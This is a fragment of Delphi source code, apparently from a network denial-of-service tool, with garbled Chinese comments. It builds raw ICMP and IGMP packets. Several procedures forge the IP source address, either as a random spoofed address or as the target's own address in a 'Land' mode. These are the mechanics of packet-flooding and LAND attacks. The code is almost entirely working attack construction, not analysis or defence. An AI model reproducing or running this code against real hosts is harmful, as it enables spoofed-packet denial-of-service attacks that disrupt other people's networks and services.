  IPHeader.ip_ttl := RandomRange(128, 250); //����ʱ��
  IPHeader.ip_protocol := IPPROTO_ICMP; //Э������
  IPHeader.ip_checksum := 0; //У���
  IPHeader.ip_srcaddr := Remote.sin_addr.S_addr; //Դ��ַ
  IPHeader.ip_destaddr := Remote.sin_addr.S_addr; //Ŀ���ַ

//�ڶ����֣���ʼ��ICMPͷ
  ICMPHeader.icmp_type := 0; //0,14Ч����
  ICMPHeader.icmp_code := 255;
  ICMPHeader.icmp_checksum := 0;
  ICMPHeader.icmp_id := 2;
  ICMPHeader.icmp_seq := 999;
  ICMPHeader.timestamp := GetTickCount;

//�������֣�����У���
  FillChar(Buf, SizeOf(Buf), #0);
//����ICMPͷУ���
  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
  CopyMemory(@Buf[SizeOf(T_IP_Header)], @ICMPHeader, SizeOf(T_ICMP_Header));
  FillChar(Buf[SizeOf(T_IP_Header) + SizeOf(T_ICMP_Header)], ICMP_PACKET, 'E');
  ICMPHeader.icmp_checksum := CheckSum(Buf, iTotalSize);

//����IPͷУ���
  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
  CopyMemory(@Buf[SizeOf(T_IP_Header)], @ICMPHeader, SizeOf(T_ICMP_Header));
  IPHeader.ip_checksum := CheckSum(Buf, SizeOf(T_IP_Header) + SizeOf(T_ICMP_Header));

  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
end;

//�����Ϣ�ؽ�IGMPͷ
procedure BuildIGMPHeaders(ToIP: string;
  var Buf: TIGMPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);
var
  FromIP: string;
  IPHeader: T_IP_Header;
  IGMPHeader: T_IGMP_Header;
  iIPVersion, iIPSize: Word;
begin
  Randomize;
  Remote.sin_family := AF_INET;
  Remote.sin_port := htons(Random(65535) + 1);
  Remote.sin_addr.S_addr := inet_Addr(PChar(ToIP));
//��һ���֣���ʼ��IPͷ
  iTotalSize := SizeOf(T_IP_Header) + SizeOf(T_IGMP_Header) + IGMP_PACKET;
  iIPVersion := 4;
  iIPSize := SizeOf(T_IP_Header) div SizeOf(Longword);
  IPHeader.ip_verlen := (iIPVersion shl 4) or iIPSize;
  IPHeader.ip_tos := 0; //IP��������
  IPHeader.ip_offset := 0; //��ƫ����
  IPHeader.ip_totallength := htons(iTotalSize); //���ݰ�����
  IPHeader.ip_id := 1; //��UDP��ͬ
  IPHeader.ip_ttl := RandomRange(128, 250); //����ʱ��
  IPHeader.ip_protocol := IPPROTO_IGMP; //Э������
  IPHeader.ip_checksum := 0; //У���

//�������Դ��ַ
  FromIP := IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1) + '.' +
    IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1);
  IPHeader.ip_srcaddr := inet_Addr(PChar(FromIP));
  IPHeader.ip_destaddr := Remote.sin_addr.S_addr; //Ŀ���ַ

//�ڶ����֣���ʼ��IGMPͷ
  IGMPHeader.igmp_type := 0;
  IGMPHeader.igmp_code := 25;
  IGMPHeader.igmp_checksum := 0;
  IGMPHeader.group := 0;

//�������֣�����У���
  FillChar(Buf, SizeOf(Buf), #0);
  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
  CopyMemory(@Buf[SizeOf(T_IP_Header)], @IGMPHeader, SizeOf(T_IGMP_Header));
  FillChar(Buf[SizeOf(T_IP_Header) + SizeOf(T_IGMP_Header)], IGMP_PACKET, 'X');
  IGMPHeader.igmp_checksum := CheckSum(Buf, iTotalSize);

  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
  CopyMemory(@Buf[SizeOf(T_IP_Header)], @IGMPHeader, SizeOf(T_IGMP_Header));
  IPHeader.ip_checksum := CheckSum(Buf, SizeOf(T_IP_Header) + SizeOf(T_IGMP_Header));

  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));

end;

//(2)Landģʽ�ؽ�IGMPͷ
procedure LandBuildIGMPHeaders(ToIP: string;
  var Buf: TIGMPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);

var
  IPHeader: T_IP_Header;
  IGMPHeader: T_IGMP_Header;
  iIPVersion, iIPSize: Word;
begin
  Randomize;
  Remote.sin_family := AF_INET;
  Remote.sin_port := htons(Random(65535) + 1);
  Remote.sin_addr.S_addr := inet_Addr(PChar(ToIP));
//��һ���֣���ʼ��IPͷ
  iTotalSize := SizeOf(T_IP_Header) + SizeOf(T_IGMP_Header) + IGMP_PACKET;
  iIPVersion := 4;
  iIPSize := SizeOf(T_IP_Header) div SizeOf(Longword);
  IPHeader.ip_verlen := (iIPVersion shl 4) or iIPSize;
  IPHeader.ip_tos := 0; //IP��������
  IPHeader.ip_offset := 0; //��ƫ����
  IPHeader.ip_totallength := htons(iTotalSize); //���ݰ�����
  IPHeader.ip_id := 1; //��UDP��ͬ
  IPHeader.ip_ttl := RandomRange(128, 250); //����ʱ��
  IPHeader.ip_protocol := IPPROTO_IGMP; //Э������
  IPHeader.ip_checksum := 0; //У���
  IPHeader.ip_srcaddr := Remote.sin_addr.S_addr; //Դ��ַ
  IPHeader.ip_destaddr := Remote.sin_addr.S_addr; //Ŀ���ַ

//�ڶ����֣���ʼ��IGMPͷ
  IGMPHeader.igmp_type := 0;
  IGMPHeader.igmp_code := 25;
  IGMPHeader.igmp_checksum := 0;
  IGMPHeader.group := 0;

//�������֣�����У���
  FillChar(Buf, SizeOf(Buf), #0);
  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
  CopyMemory(@Buf[SizeOf(T_IP_Header)], @IGMPHeader, SizeOf(T_IGMP_Header));
  FillChar(Buf[SizeOf(T_IP_Header) + SizeOf(T_IGMP_Header)], IGMP_PACKET, 'X');
  IGMPHeader.igmp_checksum := CheckSum(Buf, iTotalSize);

  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
  CopyMemory(@Buf[SizeOf(T_IP_Header)], @IGMPHeader, SizeOf(T_IGMP_Header));
  IPHeader.ip_checksum := CheckSum(Buf, SizeOf(T_IP_Header) + SizeOf(T_IGMP_Header));

  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));

end;


end.

